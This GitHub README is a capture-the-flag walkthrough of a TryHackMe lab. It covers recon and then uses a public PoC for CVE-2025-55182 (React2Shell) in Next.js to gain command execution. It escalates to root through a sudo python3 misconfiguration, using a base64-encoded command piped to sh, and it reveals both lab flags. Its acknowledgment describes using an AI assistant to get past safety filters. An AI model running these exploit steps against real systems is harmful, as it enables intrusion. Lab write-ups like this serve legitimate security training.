<p align="right">
  <b>Language / Lingua:</b>
  <b>🇬🇧 English</b> | 
  <a href="README.it.md">🇮🇹 Italiano</a>
</p>

# 📋 TryHackMe: Corp Website (Romance & Co) - Walkthrough & Technical Post-Mortem

<p align="center">
  <img src="assets/00-thm-room-overview.png" alt="Romance and Co Room Overview" width="700"/>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme" alt="TryHackMe" />
  <img src="https://img.shields.io/badge/Category-Web-blue?style=for-the-badge" alt="Web" />
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Medium" />
  <img src="https://img.shields.io/badge/Vulnerability-CVE--2025--55182-critical?style=for-the-badge" alt="CVE-2025-55182" />
  <img src="https://img.shields.io/badge/PrivEsc-Sudoers%20Misconfig-brightgreen?style=for-the-badge" alt="PrivEsc" />
</p>

---

## 📖 Table of Contents
- [Room Overview](#-room-overview)
- [Phase 1: Reconnaissance & Enumeration](#-phase-1-reconnaissance--enumeration)
  - [1. Web Application & Contact Form Analysis](#1-web-application--contact-form-analysis)
  - [2. Port Scanning (Nmap)](#2-port-scanning-nmap)
  - [3. Directory Fuzzing & Rabbit Hole (Gobuster)](#3-directory-fuzzing--rabbit-hole-gobuster)
- [Phase 2: Vulnerability Identification (Weaponization)](#-phase-2-vulnerability-identification-weaponization)
  - [1. Response Headers Fingerprinting (Next.js & RSC)](#1-response-headers-fingerprinting-nextjs--rsc)
  - [2. Probing Server Actions with `Next-Action`](#2-probing-server-actions-with-next-action)
  - [3. Vulnerability Deep Dive: CVE-2025-55182 (React2Shell)](#3-vulnerability-deep-dive-cve-2025-55182-react2shell)
- [Phase 3: Exploit Troubleshooting & Environment Setup](#-phase-3-exploit-troubleshooting--environment-setup)
  - [1. Initial Attempt: Bash Script (Blind RCE)](#1-initial-attempt-bash-script-blind-rce)
  - [2. Python PoC Transition & Resolving Version Conflicts with Pyenv](#2-python-poc-transition--resolving-version-conflicts-with-pyenv)
  - [3. RCE Execution & Initial Foothold](#3-rce-execution--initial-foothold)
- [Phase 4: Flags Retrieval & Privilege Escalation](#-phase-4-flags-retrieval--privilege-escalation)
  - [1. User Flag](#1-user-flag)
  - [2. Privilege Escalation: Sudo Privileges Audit](#2-privilege-escalation-sudo-privileges-audit)
  - [3. Resolving the Quoting Escape Hell via Base64 Encoding](#3-resolving-the-quoting-escape-hell-via-base64-encoding)
  - [4. Root Flag](#4-root-flag)
- [🛡️ Defensive Remediation & Mitigations](#️-defensive-remediation--mitigations)
- [🔗 Resources & References](#-resources--references)
- [💡 Acknowledgments](#-acknowledgments)

---

## 🎯 Room Overview

| Parameter | Details |
| :--- | :--- |
| **Room Name** | Romance and Co (Corp Website) |
| **Platform** | [TryHackMe](https://tryhackme.com/) |
| **Points** | 200 |
| **Difficulty** | Medium |
| **Initial Foothold** | Insecure Deserialization / Prototype Pollution in Next.js Server Actions (CVE-2025-55182) |
| **Privilege Escalation** | Sudoers Misconfiguration with `NOPASSWD: /usr/bin/python3` (GTFOBins) |

---

## 🔍 Phase 1: Reconnaissance & Enumeration

### 1. Web Application & Contact Form Analysis
Browsing to the target application at `http://<TARGET_IP>:3000` presents the corporate portal for *Romance & Co.*:

<p align="center">
  <img src="assets/01-target-homepage.png" alt="Romance and Co Homepage" width="650"/>
</p>

Scrolling down to the contact area reveals a booking request form:

<p align="center">
  <img src="assets/02-contact-form.png" alt="Contact Form" width="650"/>
</p>

- **Client-Side Validation**: Entering an invalid email address (omitting the `@` symbol) triggers an inline HTML5 browser popup, preventing any network packet from leaving the client.

<p align="center">
  <img src="assets/03-client-side-error.png" alt="Client-Side Validation Error" width="650"/>
</p>

- **HTTP Request Inspection**: When a valid dummy email is provided, the browser simply dispatches a `GET /?`. The form is purely cosmetic/static and does not transmit meaningful payload data to the backend.

---

### 2. Port Scanning (Nmap)
A rapid TCP port scan against the target host:

```bash
nmap 10.113.159.29
```

<p align="center">
  <img src="assets/04-nmap-scan.png" alt="Nmap Scan Result" width="650"/>
</p>

Two open TCP ports were detected:
- `22/tcp open ssh`: Standard OpenSSH server.
- `3000/tcp open ppp`: Target web application running on port 3000.

---

### 3. Directory Fuzzing & Rabbit Hole (Gobuster)
We enumerated web directories on port 3000 using Gobuster and the standard `dirb/common.txt` wordlist:

```bash
gobuster dir -u http://10.113.159.29:3000/ -w /usr/share/wordlists/dirb/common.txt
```

<p align="center">
  <img src="assets/05-gobuster-308.png" alt="Gobuster Scan Result" width="650"/>
</p>

- **Finding**: Gobuster reported `/cgi-bin/` returning an HTTP `308 Permanent Redirect`.
- **The Rabbit Hole**: The 308 status mandates that the client repeat the request at the redirected destination using the identical HTTP method. By appending the `-r` (*follow redirects*) flag, Gobuster followed the redirect and received a `404 Not Found`. This confirmed that `/cgi-bin/` was merely a dead-end rabbit hole.

---

## 🎯 Phase 2: Vulnerability Identification (Weaponization)

### 1. Response Headers Fingerprinting (Next.js & RSC)
Inspecting the HTTP response of the homepage via Burp Suite:

<p align="center">
  <img src="assets/06-burp-rsc-headers.png" alt="Burp HTTP Response Headers" width="650"/>
</p>

Key indicators identified:
- `X-Powered-By: Next.js`
- `Vary: rsc, next-router-state-tree, next-router-prefetch, ...`
- HTML Source Comments: `<!--3WpzTMYEK9QG0eqIBQxrR-->` (Next.js Build ID) and React Server Components markers (`<!--$-->`).

These headers confirmed that the server employs **React Server Components (RSC)** powered by the internal **Flight** serialization protocol.

---

### 2. Probing Server Actions with `Next-Action`
To verify whether the server actively resolves direct Server Action invocations, we submitted a `POST /?` request with an arbitrary action identifier header:
```http
POST /? HTTP/1.1
Host: 10.113.159.29:3000
Next-Action: dummy
```

<p align="center">
  <img src="assets/07-burp-next-action-req.png" alt="Burp Next-Action Request" width="650"/>
</p>

Server response:

<p align="center">
  <img src="assets/08-next-action-response.png" alt="Server Action Not Found Response" width="650"/>
</p>

```text
Server action not found.
```

> [!IMPORTANT]
> The `Server action not found.` response proved that the backend was listening for and attempting to parse Server Action IDs, exposing it directly to **CVE-2025-55182**.

---

### 3. Vulnerability Deep Dive: CVE-2025-55182 (React2Shell)
**CVE-2025-55182** (*React2Shell*) stems from insecure deserialization of `multipart/form-data` payloads inside React Flight's deserialization mechanism in Next.js.
By crafting specific object graph definitions (e.g., `{"then":"$1:__proto__:then", ...}`), an attacker can achieve **Prototype Pollution** on global JavaScript object prototypes, allowing the invocation of Node.js built-ins such as `child_process.execSync` to achieve unauthenticated **Remote Code Execution (RCE)**.

---

## 🛠️ Phase 3: Exploit Troubleshooting & Environment Setup

### 1. Initial Attempt: Bash Script (Blind RCE)
We initially tested a standalone bash exploit script (`exploit-nextjs.sh`) using curl:

```bash
bash exploit-nextjs.sh http://10.114.132.93:3000 "ls -la"
```

<p align="center">
  <img src="assets/09-bash-exploit-blind.png" alt="Bash Exploit Timeout" width="650"/>
</p>

The script reported: `SUCCESS - Request timed out (server hung executing command)`.
However, no command output was printed to the terminal. Checking the script's source code:
```bash
curl -s -o /dev/null -w "%{http_code}" ...
```
The script discarded the response body with `-o /dev/null`, operating as a **Blind RCE** with no feedback channel.

---

### 2. Python PoC Transition & Resolving Version Conflicts with Pyenv
To obtain interactive output, we cloned the Python exploit by [Chocapikk/CVE-2025-55182](https://github.com/Chocapikk/CVE-2025-55182):

```bash
git clone https://github.com/Chocapikk/CVE-2025-55182.git
cd CVE-2025-55182
```

<p align="center">
  <img src="assets/10-clone-chocapikk-poc.png" alt="Git Clone Chocapikk Exploit" width="650"/>
</p>

Upon running the exploit, two environment issues arose:
1. `ModuleNotFoundError: No module named 'rich_click'`
2. The system was running **Python 3.8.20**, triggering `TypeError: 'type' object is not subscriptable` due to modern type hinting (such as `list[dict]` or `def func() -> list[...]`), which requires Python 3.9+.

<p align="center">
  <img src="assets/11-pyenv-troubleshooting.png" alt="Pyenv Troubleshooting & Pip Install" width="650"/>
</p>

**Resolution**:
```bash
# Switch to Python 3.11 pre-installed in the environment
pyenv local 3.11.9

# Install project dependencies
pip install -r requirements.txt
```

---

### 3. RCE Execution & Initial Foothold
With Python 3.11 and the required dependencies installed, we executed a test command:

```bash
python3 exploit.py -u http://10.113.159.29:3000 -c "whoami"
```

<p align="center">
  <img src="assets/12-rce-daniel-whoami.png" alt="Successful whoami execution" width="650"/>
</p>

```text
Success
daniel
```
Initial foothold confirmed as the unprivileged service user **daniel**.

---

## 🚩 Phase 4: Flags Retrieval & Privilege Escalation

### 1. User Flag
With reliable command execution established, we retrieved the user flag:

```bash
python3 exploit.py -u http://10.113.159.29:3000 -c "cat /home/daniel/user.txt"
```

<p align="center">
  <img src="assets/13-user-flag.png" alt="User Flag Output" width="650"/>
</p>

<details>
  <summary>👁️ <b>Click to reveal the User Flag</b></summary>
  <br>

  ```text
  THM{R34c7_2_5h311_3xpl017}
  ```
</details>

---

### 2. Privilege Escalation: Sudo Privileges Audit
To discover potential privilege escalation vectors, we audited sudo permissions using the non-interactive flag `-n` (preventing sudo from hanging if a password prompt is issued):

```bash
python3 exploit.py -u http://10.113.159.29:3000 -c "sudo -n -l"
```

<p align="center">
  <img src="assets/14-sudo-l-misconfig.png" alt="Sudo -n -l Output" width="650"/>
</p>

```text
User daniel may run the following commands on romance:
    (root) NOPASSWD: /usr/bin/python3
```

> [!NOTE]
> User `daniel` is authorized to execute `/usr/bin/python3` as `root` without providing a password. Per [GTFOBins](https://gtfobins.github.io/gtfobins/python/#sudo), interactive script interpreters with sudo access allow reading arbitrary files and spawning interactive root shells.

---

### 3. Resolving the Quoting Escape Hell via Base64 Encoding
Attempting to run an inline Python command to read `/root/root.txt`:
```bash
python3 exploit.py -u ... -c "sudo /usr/bin/python3 -c 'print(open(\"/root/root.txt\").read())'"
python3 exploit.py -u ... -c "sudo python3 -c 'import os; os.system(\"cat /root/root.txt\")'"
```

The server consistently responded with `Failed (status: 500)`:

<p align="center">
  <img src="assets/15-quote-escape-fails.png" alt="Escalation Quote Hell Fails" width="650"/>
</p>

**Why did this fail?**
The command had to survive 4 distinct parsing layers:
1. Attacker machine's Bash shell.
2. Local Python script argument handling.
3. HTTP JSON/multipart payload serialization (`execSync('...')`).
4. Remote server target shell.

Nested quote characters (`"`, `'`, `\"`) broke string boundaries during JSON/JS deserialization on Node.js, yielding an HTTP 500 internal server error.

**The Solution: Base64 Encoding**
Encoding the payload in Base64 strips all quotation marks and special characters:

```bash
# 1. Target Root Command:
sudo /usr/bin/python3 -c 'print(open("/root/root.txt").read())'

# 2. Resulting Base64 String:
c3VkbyAvdXNyL2Jpbi9weXRob24zIC1jICdwcmludChvcGVuKCIvcm9vdC9yb290LnR4dCIpLnJlYWQoKSkn

# 3. Clean Execution Payload:
echo c3VkbyAvdXNyL2Jpbi9weXRob24zIC1jICdwcmludChvcGVuKCIvcm9vdC9yb290LnR4dCIpLnJlYWQoKSkn | base64 -d | sh
```

Execution breakdown:
- `echo <STRING>`: Outputs clean alphanumeric characters without quotes.
- `| base64 -d`: Decodes the raw command directly in memory.
- `| sh`: Pipes the decoded command directly to the system shell with root privileges.

---

### 4. Root Flag
Sending the Base64 payload:

```bash
python3 exploit.py -u http://10.113.159.29:3000 -c "echo c3VkbyAvdXNyL2Jpbi9weXRob24zIC1jICdwcmludChvcGVuKCIvcm9vdC9yb290LnR4dCIpLnJlYWQoKSkn | base64 -d | sh"
```

<p align="center">
  <img src="assets/16-root-flag-base64.png" alt="Root Flag Output" width="650"/>
</p>

<details>
  <summary>👁️ <b>Click to reveal the Root Flag</b></summary>
  <br>

  ```text
  THM{Pr1v_35c_47_175_f1n357}
  ```
</details>

---

## 🛡️ Defensive Remediation & Mitigations

| Vulnerability | Root Cause | Impact | Recommended Mitigation |
| :--- | :--- | :--- | :--- |
| **CVE-2025-55182 (React2Shell)** | Insecure Flight/RSC deserialization in Next.js causing Prototype Pollution | Unauthenticated Remote Code Execution (RCE) | Immediately upgrade `next` and `react` packages to official vendor patched releases. |
| **Sudoers Misconfiguration** | `NOPASSWD: /usr/bin/python3` privilege granted to user account in `/etc/sudoers` | Full Root Privilege Escalation | Strictly adhere to the Principle of Least Privilege (PoLP). Never grant sudo privileges on interactive interpreters (Python, Perl, Bash, Vim) capable of arbitrary file read or shell breakout (GTFOBins). |

---

## 🔗 Resources & References

- [Chocapikk CVE-2025-55182 PoC Exploit](https://github.com/Chocapikk/CVE-2025-55182)
- [GTFOBins - Python Sudo Escalation](https://gtfobins.github.io/gtfobins/python/#sudo)
- [TryHackMe - Romance and Co Room](https://tryhackme.com/)

---

## 💡 Acknowledgments

- Documentation, technical troubleshooting analysis, and translation refined with the assistance of **Gemini (Google AI Studio)** used as a security research assistant to overcome standard consumer safety filter false positives during lab activities.

